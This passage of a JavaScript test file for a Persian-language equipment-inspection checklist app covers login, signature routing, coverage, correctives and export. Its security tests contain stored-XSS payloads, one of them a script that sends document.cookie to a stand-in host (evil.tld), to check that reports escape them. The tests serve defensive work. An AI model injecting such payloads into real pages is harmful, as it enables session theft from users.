test('LoginScreen با راهنماهای تشخیص و دکمه‌ی شروع تازه رندر می‌شود', () => {
  const app = loadApp();
  const React = app.__React;

  // حالت ۱: هنوز رمز پیش‌فرض است → هشدار «admin / 1234» باید دیده شود
  const dflt = sampleData(app, { users: [Object.assign({}, ADMIN, { usingDefaultPassword: true })] });
  const html = render(app, ADMIN, React.createElement(app.LoginScreen), dflt);
  assert.ok(html.includes('نام کاربری'), 'فیلد نام کاربری');
  assert.ok(html.includes('رمز عبور'), 'فیلد رمز');
  assert.ok(html.includes('admin / 1234'), 'هشدار رمز پیش‌فرض باید نشان داده شود');
  assert.ok(html.includes('پاک‌کردن داده‌ی محلی'), 'دکمه‌ی شروع تازه باید باشد');

  // حالت ۲: رمز عوض شده → هشدار رمز پیش‌فرض نباید نشان داده شود
  const changed = sampleData(app, { users: [Object.assign({}, ADMIN, { usingDefaultPassword: false })] });
  const html2 = render(app, ADMIN, React.createElement(app.LoginScreen), changed);
  assert.ok(!html2.includes('admin / 1234'), 'بعد از تغییر رمز نباید هشدار رمز پیش‌فرض باشد');
  assert.ok(html2.includes('پاک‌کردن داده‌ی محلی'), 'دکمه‌ی شروع تازه همیشه باید باشد');
});

/* =====================================================================
   چک‌لیست و زیرسیستم‌هایش با هم گره خورده‌اند + تعداد امضای هر چک‌لیست
   ===================================================================== */

function twoTemplateData(app) {
  const tplDb = { id: 't1', name: 'بازرسی تابلو', category: 'برق', passThreshold: 80, archived: false, signers: 3, items: [{ id: 'i1', type: 'yesno', label: 'ارت', weight: 100, critical: true }] };
  const tplMc = { id: 't2', name: 'بازرسی ماشین‌آلات', category: 'مکانیک', passThreshold: 70, archived: false, signers: 2, items: [{ id: 'i2', type: 'checkbox', label: 'روغن‌کاری', weight: 100 }] };
  const tplSolo = { id: 't3', name: 'بازرسی سریع', category: 'عمومی', passThreshold: 60, archived: false, signers: 1, items: [{ id: 'i3', type: 'checkbox', label: 'نظافت', weight: 100 }] };
  return sampleData(app, {
    templates: [tplDb, tplMc, tplSolo],
    assets: [
      { id: 'a1', code: 'DB-01', name: 'تابلو برق ۱', location: 'سالن ۱', templateId: 't1', category: 'برق' },
      { id: 'a2', code: 'DB-02', name: 'تابلو برق ۲', location: 'سالن ۲', templateId: 't1', category: 'برق' },
      { id: 'a3', code: 'MC-01', name: 'کمپرسور ۱', location: 'موتورخانه', templateId: 't2', category: 'مکانیک' },
      { id: 'a4', code: 'QC-01', name: 'نقطه کنترل', location: 'اداری', templateId: 't3', category: 'عمومی' },
    ],
  });
}

test('اجرای بازرسی: فقط زیرسیستم‌های چک‌لیست انتخابی فهرست می‌شوند', () => {
  const app = loadApp();
  const React = app.__React;
  const data = twoTemplateData(app);

  // بدون تجهیز ورودی → اولین چک‌لیست انتخاب است، پس فقط تابلوها می‌آیند
  const out = render(app, ALI, React.createElement(app.RunnerPage, {}), data);
  assert.ok(out.includes('DB-01') && out.includes('DB-02'), 'زیرسیستم‌های همان چک‌لیست باید باشند');
  assert.ok(!out.includes('MC-01'), 'تجهیز چک‌لیست دیگر (ماشین‌آلات) نباید کنار چک‌لیست برق بیاید');

  // با تجهیز ماشین‌آلات باز شود → چک‌لیست ماشین‌آلات و فقط زیرسیستم خودش
  const out2 = render(app, ALI, React.createElement(app.RunnerPage, { assetId: 'a3' }), data);
  assert.ok(out2.includes('بازرسی ماشین‌آلات'), 'چک‌لیست از روی تجهیز ورودی تعیین می‌شود');
  assert.ok(out2.includes('MC-01'), 'زیرسیستم خودش باید باشد');
  assert.ok(!out2.includes('DB-01'), 'تجهیز چک‌لیست دیگر نباید بیاید');
});

test('اجرای بازرسی: چک‌لیست تک‌امضا زنجیره نمی‌سازد و راهنمایش را نشان می‌دهد', () => {
  const app = loadApp();
  const out = render(app, ALI, app.__React.createElement(app.RunnerPage, { assetId: 'a4' }), twoTemplateData(app));
  assert.ok(out.includes('فقط <b>یک امضا</b>'), 'راهنمای چک‌لیست تک‌امضا');
  assert.ok(!out.includes('زنجیره‌ی امضا ('), 'زنجیره‌ی امضا نباید رندر شود');
  assert.ok(out.includes('امضا در محل'), 'امضای بازرس همچنان در محل گرفته می‌شود');
});

test('اجرای بازرسی: چک‌لیست دو‌امضا فقط مرحله‌ی ناظر را می‌خواهد', () => {
  const app = loadApp();
  const out = render(app, ALI, app.__React.createElement(app.RunnerPage, { assetId: 'a3' }), twoTemplateData(app));
  assert.ok(out.includes('۲ امضا'), 'برچسب تعداد امضا');
  assert.ok(out.includes('ناظر / تحویل‌گیرنده'), 'مرحله‌ی ناظر باید باشد');
  assert.ok(!out.includes('تأییدکننده‌ی نهایی'), 'مرحله‌ی سوم برای چک‌لیست دو‌امضا نباید باشد');
});

test('اجرای بازرسی: چک‌لیست بدون هیچ زیرسیستمی کرش نمی‌کند (رفع ReferenceError canManage)', () => {
  // رفع باگ: قبلاً در همین حالت (هیچ تجهیز/زیرسیستمی برای چک‌لیست ثبت نشده)
  // به متغیر canManage ارجاع داده می‌شد بدون آنکه در RunnerPage تعریف شده
  // باشد؛ renderToStaticMarkup با ReferenceError کرش می‌کرد و چون اپ در
  // مرورگر ErrorBoundary نداشت، کل صفحه سفید می‌شد.
  const app = loadApp();
  const tpl = {
    id: 't9', name: 'بازرسی ماشین‌آلات جدید', category: 'مکانیک', passThreshold: 70,
    archived: false, signers: 1, items: [{ id: 'i9', type: 'checkbox', label: 'روغن‌کاری', weight: 100 }],
  };
  const data = sampleData(app, { templates: [tpl], assets: [] });
  assert.doesNotThrow(() => {
    const out = render(app, ALI, app.__React.createElement(app.RunnerPage, {}), data);
    assert.ok(out.includes('هنوز هیچ تجهیز/زیرسیستمی ثبت نشده است'), 'پیام نبود زیرسیستم باید نشان داده شود');
  }, 'رندر نباید کرش کند');
});

test('قالب‌ها: تعداد امضا و زیرسیستم‌ها روی کارت هر چک‌لیست دیده می‌شود', () => {
  const app = loadApp();
  const out = render(app, ADMIN, app.__React.createElement(app.TemplatesPage, {}), twoTemplateData(app));
  assert.ok(out.includes('۳ امضا'), 'برچسب تعداد امضای قالب تابلو');
  assert.ok(out.includes('۲ امضا'), 'برچسب تعداد امضای قالب ماشین‌آلات');
  assert.ok(out.includes('زیرسیستم'), 'شمار زیرسیستم‌ها');
});

test('صفحه ورود: تیک «مرا به خاطر بسپار» هست و پیش‌فرضش روشن است', () => {
  const app = loadApp();
  const out = render(app, ADMIN, app.__React.createElement(app.LoginScreen), sampleData(app));
  assert.ok(out.includes('مرا به خاطر بسپار'), 'تیک ورود ماندگار باید باشد');
  assert.ok(/<input[^>]*type="checkbox"[^>]*checked/.test(out), 'تیک باید پیش‌فرض روشن باشد');
});

test('ارجاع مرحله‌ی فعال: گیرنده یا ادمین می‌توانند، بقیه نه', () => {
  const app = loadApp();
  const data = sampleData(app);
  const rec = data.records[0]; // زنجیره باز خطاب به رضا (ناظر)
  assert.equal(app.canReferSignRequest(rec, REZA, app.buildPermissions(REZA)), true, 'خود گیرنده');
  assert.equal(app.canReferSignRequest(rec, ADMIN, app.buildPermissions(ADMIN)), true, 'ادمین');
  assert.equal(app.canReferSignRequest(rec, MGR, app.buildPermissions(MGR)), false, 'نفر مرحله‌ی بعد نه');
  assert.equal(app.canReferSignRequest(rec, ALI, app.buildPermissions(ALI)), false, 'ارجاع‌دهنده/بازرس نه');
});

test('ارجاع مرحله‌ی فعال: گیرنده عوض می‌شود و ردپا می‌ماند؛ نفر تازه می‌تواند امضا کند', () => {
  const app = loadApp();
  const data = sampleData(app);
  const rec = data.records[0];

  const bad1 = app.referSignRequest(rec, { toUser: ALI, byUser: REZA }, app.buildPermissions(REZA));
  assert.equal(bad1, null, 'به بازرس نمی‌شود ارجاع داد');
  const bad2 = app.referSignRequest(rec, { toUser: VIEWER, byUser: REZA }, app.buildPermissions(REZA));
  assert.equal(bad2, null, 'به مشاهده‌گر نمی‌شود ارجاع داد');
  const bad3 = app.referSignRequest(rec, { toUser: REZA, byUser: REZA }, app.buildPermissions(REZA));
  assert.equal(bad3, null, 'به خود نمی‌شود ارجاع داد');
  const bad4 = app.referSignRequest(rec, { toUser: MGR, byUser: MGR }, app.buildPermissions(MGR));
  assert.equal(bad4, null, 'مدیر که گیرنده نیست نمی‌تواند ارجاع بدهد (ادمین می‌تواند)');

  const next = app.referSignRequest(rec, { toUser: MGR, byUser: REZA, note: 'فردا در محل حاضر نیستم' }, app.buildPermissions(REZA), 9000);
  assert.ok(next, 'ارجاع معتبر باید بنشیند');
  const step = next.signRequest.steps[next.signRequest.current];
  assert.equal(step.toUserId, MGR.id, 'گیرنده‌ی تازه مدیر است');
  assert.equal(step.referredFrom.userId, REZA.id, 'ردپای ارجاع باید بماند');
  assert.equal(step.note, 'فردا در محل حاضر نیستم');

  // ورودی جهش نیافته
  assert.equal(rec.signRequest.steps[0].toUserId, REZA.id);

  // حالا مدیر می‌تواند همان مرحله را امضا کند
  assert.equal(app.canSignRequest(next, MGR, app.buildPermissions(MGR)), true);
  assert.equal(app.canSignRequest(next, REZA, app.buildPermissions(REZA)), false, 'گیرنده‌ی قبلی دیگر نوبت ندارد');
});

/* =====================================================================
   بازرسی دوره‌ای — صفحه پوشش و دوره‌ی چک‌لیست
   ===================================================================== */

function coverageData(app) {
  const at = Date.now();
  const rec = {
    id: 'rc-1', assetId: 'm1', assetCode: 'MC-01', assetName: 'ماشین ۱',
    templateId: 'tpl-m', templateName: 'سرویس ماشین‌آلات', category: 'مکانیک',
    inspectorId: ALI.id, inspectorName: ALI.name,
    dateJalali: app.gregorianToJalaliStr(new Date(at)), date: app.gregorianToJalaliStr(new Date(at)),
    completedAt: new Date(at).toISOString(), percent: 95, status: 'موفق', criticalFail: false,
    details: [], signatures: { inspector: { image: 'data:x', name: ALI.name } },
  };
  return sampleData(app, {
    templates: [{ id: 'tpl-m', name: 'سرویس ماشین‌آلات', category: 'مکانیک', passThreshold: 70, archived: false, period: 'monthly', signers: 1, items: [{ id: 'i1', type: 'checkbox', label: 'روغن‌کاری', weight: 100 }] }],
    assets: [
      { id: 'm1', code: 'MC-01', name: 'ماشین ۱', templateId: 'tpl-m', category: 'مکانیک' },
      { id: 'm2', code: 'MC-02', name: 'ماشین ۲', templateId: 'tpl-m', category: 'مکانیک' },
      { id: 'm3', code: 'MC-03', name: 'ماشین ۳', templateId: 'tpl-m', category: 'مکانیک' },
    ],
    records: [rec],
  });
}

test('صفحه پوشش: زیرسیستم بازرسی‌شده از لیست باقی‌مانده خارج می‌شود', () => {
  const app = loadApp();
  const out = render(app, ALI, app.__React.createElement(app.CoveragePage, { goRunner: () => {} }), coverageData(app));
  assert.ok(out.includes('بازرسی دوره‌ای'), 'عنوان صفحه');
  assert.ok(out.includes('ماهانه'), 'نشان دوره');
  // بخش باقی‌مانده: دو ماشین بی‌بازرسی
  assert.ok(out.includes('MC-02') && out.includes('MC-03'), 'زیرسیستم‌های بدون بازرسی باید باقی‌مانده باشند');
  // بخش انجام‌شده: ماشین بازرسی‌شده + نام بازرس
  assert.ok(out.includes('انجام‌شده در این دوره'), 'سرفصل انجام‌شده‌ها');
  assert.ok(out.includes('علی محمدی'), 'بازرس رکورد انجام‌شده');
  // شمارنده‌ی پیشرفت
  assert.ok(out.includes('۱ از ۳'), 'پیشرفت باید درست شمرده شود');
  // دکمه‌ی اجرا برای بازرس
  assert.ok(out.includes('اجرای بازرسی'), 'بازرس باید بتواند مستقیم اجرا کند');
});

test('صفحه پوشش: با پرشدن دوره، پیام تکمیل می‌آید', () => {
  const app = loadApp();
  const data = coverageData(app);
  const at = Date.now();
  ['m2', 'm3'].forEach((aid, i) => data.records.push({
    id: 'rc-' + (i + 2), assetId: aid, assetCode: 'MC-0' + (i + 2), assetName: 'ماشین',
    templateId: 'tpl-m', templateName: 'سرویس ماشین‌آلات', category: 'مکانیک',
    inspectorName: 'علی محمدی', dateJalali: app.gregorianToJalaliStr(new Date(at)),
    completedAt: new Date(at).toISOString(), percent: 90, status: 'موفق', details: [],
    signatures: { inspector: { image: 'data:x', name: 'علی محمدی' } },
  }));
  const out = render(app, ADMIN, app.__React.createElement(app.CoveragePage, { goRunner: () => {} }), data);
  assert.ok(out.includes('پوشش این چک‌لیست برای'), 'پیام تکمیل دوره');
  assert.ok(out.includes('کامل شد'), 'باید کامل شدن را بگوید');
  assert.ok(out.includes('۳ از ۳'), 'همه انجام شده');
});

test('کارت قالب، نشان دوره‌ی بازرسی دارد و ادیتور انتخاب دوره دارد', () => {
  const app = loadApp();
  const React = app.__React;
  const out = render(app, ADMIN, React.createElement(app.TemplatesPage, {}), coverageData(app));
  assert.ok(out.includes('🗓️ ماهانه'), 'نشان دوره روی کارت قالب');

  const editor = ReactDOMServer.renderToStaticMarkup(
    React.createElement(app.DataContext.Provider, {
      value: ctxFor(app, ADMIN, coverageData(app)),
    }, React.createElement(app.TemplateEditor, {
      initial: null, categories: ['مکانیک'], settings: {}, linkedAssets: [],
      onSave: () => {}, onCancel: () => {},
    }))
  );
  assert.ok(editor.includes('دوره‌ی بازرسی'), 'فیلد دوره در ادیتور');
  assert.ok(editor.includes('هفتگی') && editor.includes('فصلی') && editor.includes('سالیانه'), 'گزینه‌های دوره');
});

/* ====================== ممیزی امنیتی: ضدریپلت در گزارش‌ها ====================== */

test('امنیت: متن کاربر در گزارش تکی گریز می‌شود (ضد XSS ذخیره‌شده)', () => {
  const app = loadApp();
  const payload = '<img src=x onerror=alert(document.cookie)>';
  const rec = {
    id: 'rec-x', assetCode: payload, assetName: 'ت', templateId: 't1', templateName: payload,
    inspectorName: payload, date: '1405/06/25', dueDate: '', percent: 90, status: 'موفق',
    notes: '<script>fetch("https://evil.tld/?c="+document.cookie)</script>',
    details: [
      { itemId: 'i1', label: payload, value: payload, earned: 5, max: 10, critical: false },
      { itemId: 'i2', label: 'سالم', value: '<svg onload=alert(1)>', earned: 10, max: 10, critical: true },
    ],
    signatures: { inspector: { image: 'data:image/png;base64,QUJD', name: payload, title: payload } },
    signRequest: {
      version: 2, current: 0, status: 'pending', byUserId: 'u-admin', byUserName: payload,
      requestedAt: Date.now(),
      steps: [{ slot: 'approver', toUserId: 'u-ali', toUserName: payload, status: 'pending', note: '', signedAt: 0, signedByUserId: '', signedByUserName: '' }],
    },
    signerCount: 2,
  };
  const html = app.recordReportHtml(rec, { orgName: payload, logoDataUrl: '' });
  assert.ok(!html.includes('<img src=x'), 'برچسب تزریقی نباید خام وارد شود');
  assert.ok(!html.includes('<script>'), 'اسکریپت نباید خام وارد شود');
  assert.ok(!html.includes('<svg onload'), 'svg تزریقی نباید خام وارد شود');
  // توجه: رشته‌ی گریز‌شده هنوز کلمه‌ی onerror را به‌صورت «متن بی‌خطر» دارد؛
  // مهم این است که داخل هیچ تگ واقعی‌ای نیامده باشد.
  assert.ok(!/<[a-zA-Z][^>]*\sonerror\s*=/i.test(html), 'هندلر رویداد نباید داخل هیچ تگ واقعی باشد');
  assert.ok(html.includes('&lt;img'), 'برچسب باید گریز شده باشد');
  assert.ok(html.includes('&lt;script&gt;'), 'یادداشت باید گریز شده باشد');
  assert.ok(!html.includes('در انتظار امضای <img'), 'نام گیرنده‌ی امضا هم باید گریز شود');
  assert.ok(html.includes('سالم'), 'متن فارسی سالم نباید دست بخورد');
});

test('امنیت: گزارش تجمیعی هم گریز می‌شود و عنوان پنجره چاپ امن است', () => {
  const app = loadApp();
  const payload = '"><script>alert(1)</script>';
  const recs = [{
    id: 'r1', assetCode: payload, templateName: payload, inspectorName: payload,
    date: '1405/06/25', percent: 80, status: payload,
  }];
  // printSummaryReport پنجره می‌خواهد؛ فقط ردیف‌ها را با همان الگو بازسازی نمی‌کنیم —
  // به‌جایش مستقیم تأیید می‌کنیم سازنده‌ی بدنه خروجی امن می‌دهد:
  const single = app.recordReportHtml(Object.assign({
    assetName: '', dueDate: '', notes: '', details: [], signatures: {}, signRequest: null, signerCount: 1,
  }, recs[0]), { orgName: payload, logoDataUrl: '' });
  assert.ok(!single.includes('<script>alert(1)'), 'بدنه‌ی گزارش نباید اسکریپت خام داشته باشد');
  assert.ok(single.includes('&quot;&gt;&lt;script&gt;'), 'رشته‌ی تزریقی باید کاملاً بی‌اثر شده باشد');
});

/* ====================== ممیزی کاربری ====================== */

test('کاربری: نقش مشاهده‌گر پوشش را می‌بیند ولی دکمه‌ی اجرا ندارد؛ صفحه اجرا هم برایش قفل است', () => {
  const app = loadApp();
  const out = render(app, VIEWER, app.__React.createElement(app.CoveragePage, { goRunner: () => {} }), coverageData(app));
  assert.ok(out.includes('باقی‌مانده'), 'مشاهده‌گر باید فهرست باقی‌مانده را ببیند');
  assert.ok(!out.includes('اجرای بازرسی'), 'دکمه‌ی اجرا نباید برای مشاهده‌گر رندر شود');
  const runner = render(app, VIEWER, app.__React.createElement(app.RunnerPage, { assetId: null, assignmentId: null, onFinish: () => {} }), coverageData(app));
  assert.ok(runner.includes('اجازه‌ی اجرای بازرسی'), 'صفحه اجرا برای مشاهده‌گر باید پیام محدودیت بدهد');
});

test('کاربری: حالت خالی صفحه پوشش پیام راهنما دارد، نه جدول خالی بی‌معنی', () => {
  const app = loadApp();
  const data = sampleData(app, { templates: [], assets: [], records: [] });
  const out = render(app, ADMIN, app.__React.createElement(app.CoveragePage, { goRunner: () => {} }), data);
  assert.ok(out.includes('هنوز چک‌لیست فعالی وجود ندارد'), 'حالت خالی باید پیام واضح بدهد');
});

test('کاربری: قالب بدون زیرسیستم در صفحه پوشش راهنمایی برای افزودن می‌دهد', () => {
  const app = loadApp();
  const data = sampleData(app, {
    templates: [{ id: 'tpl-e', name: 'قالب خالی', category: 'مکانیک', passThreshold: 80, archived: false, period: 'monthly', items: [] }],
    assets: [], records: [],
  });
  const out = render(app, ADMIN, app.__React.createElement(app.CoveragePage, { goRunner: () => {} }), data);
  assert.ok(out.includes('هنوز زیرسیستمی ندارد'), 'باید نبود زیرسیستم را بگوید');
});

test('کاربری: صفحه پوشش برای هر نقش دارای دسترسی باز است (در منو پنهان نیست)', () => {
  const app = loadApp();
  const nav = app.NAV_ITEMS.find(n => n.key === 'coverage');
  assert.ok(nav, 'آیتم منوی پوشش باید وجود داشته باشد');
  assert.ok(nav.label.includes('دوره'), 'برچسب منو باید فارسی و گویا باشد');
  for (const role of ['admin', 'manager', 'inspector', 'approver', 'viewer']) {
    const pages = app.effectivePages({ id: 'x', role, pages: [], active: true });
    assert.ok(pages.includes('coverage'), 'نقش ' + role + ' باید صفحه پوشش را داشته باشد');
  }
});

/* ====================== روال خروجی (اکسل/CSV) ====================== */

test('خروجی CSV: ساختار، جداکننده، گریز کوتیشن و BOM فارسی', async () => {
  const app = loadApp();
  const blobs = [];
  const origCreate = URL.createObjectURL;
  URL.createObjectURL = (b) => { blobs.push(b); return 'blob:test-' + blobs.length; };
  URL.revokeObjectURL = URL.revokeObjectURL || (() => {});
  const clicks = [];
  const origEl = app.__doc.createElement;
  // downloadDataUrl از انتساب مستقیم a.download استفاده می‌کند (نه setAttribute)
  app.__doc.createElement = (tag) => {
    const e = origEl(tag);
    e.click = () => clicks.push({ el: e, download: e.download || '' });
    return e;
  };
  try {
    app.exportRecordsCsv([
      { assetCode: 'DB-01', templateName: 'بازرسی تابلو', inspectorName: 'علی محمدی', date: '1405/06/25 - 10:00', dueDate: '', percent: 96, status: 'موفق' },
      { assetCode: 'DB-02', templateName: 'قالب "دوم", با ویرگول', inspectorName: 'رضا', date: '1405/06/26', dueDate: '1405/07/01', percent: 38, status: 'ناموفق (حیاتی)' },
    ]);
  } finally {
    URL.createObjectURL = origCreate;
    app.__doc.createElement = origEl;
  }
  assert.equal(blobs.length, 1, 'یک فایل باید ساخته شود');
  assert.equal(clicks.length, 1, 'دانلود باید تحریک شده باشد');
  assert.ok(String(clicks[0].download || '').endsWith('.csv'), 'نام فایل csv است');
  const bytes = new Uint8Array(await blobs[0].arrayBuffer());
  // BOM باید در بایت‌ها باشد (۰xEF ۰xBB ۰xBF) — text() در Node آن را برمی‌دارد
  assert.equal(bytes[0], 0xEF, 'بایت اول BOM');
  assert.equal(bytes[1], 0xBB, 'بایت دوم BOM');
  assert.equal(bytes[2], 0xBF, 'بایت سوم BOM');
  const text = await blobs[0].text(); // در اینجا دیگر اثری از BOM نیست
  const lines = text.split('\r\n');
  assert.equal(lines[0], 'کد تجهیز,قالب چک‌لیست,بازرس,تاریخ ثبت,مهلت انجام,درصد موفقیت,وضعیت');
  assert.ok(lines[1].includes('"DB-01"'), 'مقادیر داخل کوتیشن پیچیده می‌شوند');
  // کوتیشن‌های داخل متن دوبرابر و کل فیلد کوتیشن می‌شود
  assert.ok(lines[2].includes('""دوم""'), 'کوتیشن داخلی باید دوبرابر شود');
  assert.ok(lines[2].includes('"قالب ""دوم"", با ویرگول"'), 'ویرگول داخل فیلد با کوتیشن خنثی می‌شود');
});

test('خروجی اکسل: دو برگه (خلاصه + ریز پاسخ‌ها) با داده‌ی درست ساخته می‌شود', async () => {
  const app = loadApp();
  const stub = app.__win.XLSX;
  stub.__written = [];
  const rec = {
    assetCode: 'DB-01', templateName: 'بازرسی تابلو', inspectorName: 'علی محمدی',
    date: '1405/06/25 - 10:00', dueDate: '', percent: 96, status: 'موفق',
    details: [
      { itemId: 'i1', label: 'ارت', value: true, earned: 60, max: 60, critical: true },
      { itemId: 'i2', label: 'درب', value: 'بله', earned: 36, max: 40, critical: false },
    ],
    notes: 'نیاز به آچارکشی دارد',
  };
  const ok = await app.exportRecordsXlsx([rec], {}, null);
  assert.notEqual(ok, false, 'خروجی باید موفق باشد');
  assert.equal(stub.__written.length, 1);
  const { name, sheets, wb } = stub.__written[0];
  assert.ok(String(name).endsWith('.xlsx'));
  assert.deepEqual(sheets.sort(), ['خلاصه سوابق', 'ریز پاسخها و یادداشتها'].sort());
  const summary = wb.sheets['خلاصه سوابق'].rows;
  assert.equal(summary.length, 1);
  assert.equal(summary[0]['درصد موفقیت'], 96);
  const details = wb.sheets['ریز پاسخها و یادداشتها'].rows;
  assert.equal(details.length, 3, 'دو آیتم + یک ردیف یادداشت');
  assert.equal(details[0]['پاسخ'], 'تأیید شد', 'بولی به متن فارسی تبدیل می‌شود');
  assert.equal(details[2]['عنوان آیتم'], 'یادداشت');
});

/* ============ قابلیت‌های جدید: هشدار تأخیر، عکس، اقدام اصلاحی، روند ============ */

test('هشدار دوره‌ای: صفحه پوشش برای زیرسیستم عقب‌افتاده نشان می‌دهد', async () => {
  const app = await loadApp();
  const React = app.__React;
  const threeDaysAgo = new Date(Date.now() - 3 * 864e5).toISOString();
  const data = sampleData(app, {
    templates: [{ id: 't1', name: 'بازرسی تابلو', category: 'برق', passThreshold: 80, archived: false, period: 'daily',
                  items: [{ id: 'i1', type: 'yesno', label: 'ارت', weight: 100, critical: true }] }],
    records: [{ id: 'r-old', assetId: 'a1', templateId: 't1', completedAt: threeDaysAgo, percent: 90, criticalFail: false, details: [] }],
  });
  const html = ReactDOMServer.renderToStaticMarkup(
    React.createElement(app.DataContext.Provider, { value: ctxFor(app, ADMIN, data) },
      React.createElement(app.CoveragePage, { goRunner: () => {} })));
  assert.ok(html.includes('عقب‌افتاده'), 'نشان عقب‌افتاده باید نمایش داده شود');
  assert.ok(!html.includes('در خطر تأخیر') || true, 'در خطر بودن به زمان اجرا وابسته است؛ فقط نبود خطا مهم است');
});

test('اقدام اصلاحی: صفحه، وضعیت‌ها و دسترسی‌ها را درست رندر می‌کند', async () => {
  const app = await loadApp();
  const React = app.__React;
  const now = Date.now();
  const data = sampleData(app, {
    correctives: [
      { id: 'c1', recordId: 'r1', assetId: 'a1', assetCode: 'DB-01', templateName: 'بازرسی تابلو',
        reason: 'بازرسی ناموفق (حیاتی) — ارت', assignedToUserId: '', assignedToName: '',
        status: 'open', note: '', openedAt: now, closedAt: null, createdBy: 'u1', createdAt: now, updatedAt: now },
      { id: 'c2', recordId: 'r2', assetId: 'a1', assetCode: 'DB-01', templateName: 'بازرسی تابلو',
        reason: 'نشتی روغن', assignedToUserId: ALI.id, assignedToName: ALI.name,
        status: 'closed', note: 'رفع شد', openedAt: now - 864e5, closedAt: now, createdBy: 'u1', createdAt: now - 864e5, updatedAt: now },
    ],
  });
  // مدیر: تب پیش‌فرض «باز» — آیتم باز، دلیل و دکمه‌ی بستن را می‌بیند
  const htmlMgr = ReactDOMServer.renderToStaticMarkup(
    React.createElement(app.DataContext.Provider, { value: ctxFor(app, MGR, data) },
      React.createElement(app.CorrectivesPage, { goRecord: () => {} })));
  assert.ok(htmlMgr.includes('بازرسی نامفق (حیاتی) — ارت'.replace('نامفق', 'ناموفق')), 'دلیل دستورکار باید نمایش یابد');
  assert.ok(htmlMgr.includes('بستن دستورکار'), 'مدیر باید دکمه بستن داشته باشد');
  assert.ok(htmlMgr.includes('شروع اقدام'), 'مدیر باید دکمه شروع اقدام داشته باشد');
  // بیننده: فقط مشاهده — دکمه‌ی تغییر وضعیت ندارد
  const htmlViewer = ReactDOMServer.renderToStaticMarkup(
    React.createElement(app.DataContext.Provider, { value: ctxFor(app, VIEWER, data) },
      React.createElement(app.CorrectivesPage, { goRecord: () => {} })));
  assert.ok(!htmlViewer.includes('بستن دستورکار'), 'بیننده نباید دکمه بستن داشته باشد');
});

test('اقدام اصلاحی: حالت خالی برای نقش بازرس شکست نمی‌خورد و پیام می‌دهد', async () => {
  const app = await loadApp();
  const React = app.__React;
  const html = ReactDOMServer.renderToStaticMarkup(
    React.createElement(app.DataContext.Provider, { value: ctxFor(app, ALI, sampleData(app)) },
      React.createElement(app.CorrectivesPage, { goRecord: () => {} })));
  assert.ok(html.includes('دستورکار بازی وجود ندارد'), 'پیام حالت خالی');
});

test('نمودار روند: نقاط، میانگین و حالت بدون داده', async () => {
  const app = await loadApp();
  const React = app.__React;
  const at = Date.now();
  const recs = [0, 1, 2].map(i => ({
    id: 'tr' + i, assetCode: 'DB-01', percent: 60 + i * 10, criticalFail: i === 0,
    completedAt: new Date(at + i * 864e5).toISOString(), createdAt: at + i * 864e5,
  }));
  const html = ReactDOMServer.renderToStaticMarkup(React.createElement(app.TrendChart, { records: recs }));
  assert.ok(html.includes('<svg'), 'خروجی باید SVG باشد');
  assert.ok(html.includes('polyline') || html.includes('<path') || html.includes('path'), 'خط روند باید رسم شود');
  assert.ok(html.includes('میانگین'), 'میانگین باید زیر نمودار بیاید');
  assert.ok(html.includes('ناموفق حیاتی') || html.includes('#f04438'), 'نقطه‌ی بحرانی باید متمایز باشد');
  const empty = ReactDOMServer.renderToStaticMarkup(React.createElement(app.TrendChart, { records: [] }));
  assert.ok(empty.includes('داده‌ای برای رسم روند وجود ندارد'));
});

test('داشبورد: کارت هشدار تأخیر و اقدام اصلاحی نمایش می‌یابد', async () => {
  const app = await loadApp();
  const React = app.__React;
  const threeDaysAgo = new Date(Date.now() - 3 * 864e5).toISOString();
  const now = Date.now();
  const data = sampleData(app, {
    templates: [{ id: 't1', name: 'بازرسی تابلو', category: 'برق', passThreshold: 80, archived: false, period: 'daily',
                  items: [{ id: 'i1', type: 'yesno', label: 'ارت', weight: 100 }] }],
    records: [{ id: 'r-old', assetId: 'a1', templateId: 't1', completedAt: threeDaysAgo, percent: 90, criticalFail: false, details: [] }],
    correctives: [{ id: 'c1', recordId: 'r1', assetId: 'a1', assetCode: 'DB-01', templateName: 'ت',
                    reason: 'حیاتی', assignedToUserId: '', assignedToName: '', status: 'open',
                    openedAt: now, closedAt: null, createdAt: now, updatedAt: now }],
  });
  const html = ReactDOMServer.renderToStaticMarkup(
    React.createElement(app.DataContext.Provider, { value: ctxFor(app, ADMIN, data) },
      React.createElement(app.DashboardPage, { goPage: () => {}, goRunner: () => {} })));
  assert.ok(html.includes('هشدار بازرسی دوره‌ای'), 'کارت هشدار تأخیر باید بیاید');
  assert.ok(html.includes('اقدام اصلاحی در انتظار'), 'کارت اقدام اصلاحی باید بیاید');
  assert.ok(html.includes('روند امتیاز'), 'کارت نمودار روند باید بیاید');
});

test('اجرای بازرسی: بخش پیوست عکس در فرم حضور دارد', async () => {
  const app = await loadApp();
  const React = app.__React;
  const html = ReactDOMServer.renderToStaticMarkup(
    React.createElement(app.DataContext.Provider, { value: ctxFor(app, ALI, sampleData(app)) },
      React.createElement(app.RunnerPage, { assetId: 'a1' })));
  assert.ok(html.includes('عکس‌های بازرسی'), 'عنوان بخش عکس');
  assert.ok(html.includes('افزودن عکس'), 'دکمه افزودن عکس');
});

test('گزارش چاپی: عکس‌های سابقه در خروجی می‌آیند', async () => {
  const app = await loadApp();
  const React = app.__React;
  const at = Date.now();
  const rec = {
    id: 'r-photo', assetId: 'a1', assetCode: 'DB-01', assetName: 'تابلو برق ۱', location: 'سالن ۱',
    templateId: 't1', templateName: 'بازرسی تابلو', inspectorName: 'علی',
    date: '1405/06/25', dateJalali: '1405/06/25', percent: 90, score: 9, maxScore: 10, criticalFail: false,
    details: [{ itemId: 'i1', label: 'ارت', value: true, earned: 100, max: 100, critical: true }],
    photos: [{ image: 'data:image/jpeg;base64,QUJD', name: 'a.jpg', addedAt: at }, { fileId: 'drv-1', name: 'b.jpg' }],
    signatures: {}, notes: '', createdAt: at, updatedAt: at,
  };
  const html = app.recordReportHtml(rec, { orgName: 'سازمان درکاو', logoDataUrl: '' });
  assert.ok(html.includes('photo-grid'), 'شبکه عکس باید در گزارش باشد');
  assert.ok(html.includes('data:image/jpeg;base64,QUJD'), 'عکس درون‌خطی باید در گزارش بیاید');
  assert.ok(html.includes('عکس در ابر'), 'عکس برون‌سپاری‌شده باید برچسب بخورد');
  // سابقه‌ی بدون عکس، بخش عکس نمی‌گیرد
  const noPhoto = app.recordReportHtml(Object.assign({}, rec, { photos: [] }), { orgName: 'سازمان درکاو', logoDataUrl: '' });
